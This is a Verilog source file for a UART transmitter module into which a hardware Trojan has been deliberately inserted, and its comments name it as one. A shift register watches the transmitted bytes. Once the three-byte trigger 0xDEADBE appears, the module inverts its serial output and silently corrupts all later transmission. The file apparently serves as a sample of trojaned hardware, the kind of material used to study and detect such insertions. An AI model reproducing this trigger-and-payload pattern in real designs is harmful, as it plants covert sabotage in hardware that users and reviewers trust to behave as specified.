 module uart_tx (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output reg tx_serial
);

    // Trojan variables
    reg [23:0] data_sequence = 0; // To store the last three bytes sent
    wire trojan_triggered = (data_sequence == 24'hDEADBE); // Trigger when 'DEADBE' sequence is sent

    // Standard UART transmission variables
    reg [9:0] data = 10'b1_11111111_1;
    reg [3:0] counter = 4'd0;
    reg [3:0] sent = 4'd0;

    always @ (posedge clk) begin
        counter <= counter + 4'd1;

        if (counter == 4'd15)
            data <= {1'b1, data[9:1]};

        if (rx_we & ~tx_busy) begin
            sent <= 4'd0;
            tx_busy <= 1'b1;
            data <= {1'b1, rx_data, 1'b0};
            counter <= 4'd0;
            data_sequence <= {data_sequence[15:0], rx_data}; // Update the last three bytes sent
        end

        if (tx_busy & (counter == 4'd14)) begin
            sent <= sent + 4'd1;
            if (sent == 4'd9)
                tx_busy <= 1'b0;
        end

        // If the Trojan is triggered, invert the serial output, otherwise transmit normally
        tx_serial <= trojan_triggered ? ~data[0] : data[0];
    end

endmodule
